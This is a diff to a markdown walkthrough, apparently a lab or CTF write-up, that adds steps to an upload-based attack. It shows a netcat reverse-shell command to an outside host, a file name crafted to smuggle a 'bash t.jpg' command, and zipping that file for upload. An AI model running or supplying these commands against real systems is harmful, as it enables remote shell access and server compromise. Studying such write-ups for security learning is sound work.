@@ -50,10 +50,17 @@ Create a file for executing a reverse shell named `t.jpg`:
 ```
 nc home.schwarzwaelder.name 4444 -e /bin/bash
 ```
-Create an executor
-
+Create an executor file:
+```
+touch \'\`bash\ t.jpg\`\;\'.jpg
+```
+Create the ZIP file for upload:
+```
+zip joergen.zip \'\`bash\ t.jpg\`\;\'.jpg
+```
+Start the reverse shell 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNjc5MDE1MDkzLDkyMjE0NDM1LC0zOTg0OT
+eyJoaXN0b3J5IjpbOTY4MjE4NTM1LDkyMjE0NDM1LC0zOTg0OT
 E0NjEsMTE1MTU1Njg5NiwyMzg0NjAyNzIsMTkzMzM2MTc4Nywt
 MTQ2NzYxNTI2MiwtMjQzOTQyODY2LDEzMTIwNTY0NTMsOTIwND
 U1ODY1LC0xNjA2MDc4MDQwXX0=
